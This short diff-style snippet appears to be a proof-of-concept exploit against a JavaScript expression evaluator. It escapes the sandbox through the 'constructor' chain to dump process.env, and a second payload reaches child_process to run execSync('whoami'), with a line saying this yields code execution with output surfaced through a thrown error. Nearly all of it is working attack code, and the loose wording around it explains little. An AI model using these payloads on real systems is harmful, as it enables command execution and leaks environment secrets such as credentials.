@@ -1,0 +1,9 @@
+var src = '(function myTag(y){return ""[!y?"__proto__":"constructor"][y]})("constructor")("console.log(process.env)")()'
+    var ast = parse(src).body[0].expression;
+    var res = evaluate(ast);
+
+throw new Error("global.process.mainModule.constructor._load('child_process').execSync('whoami')")
+
+adding this to the our constuctor gives us codeexec, output is thrown as a error.
+
+
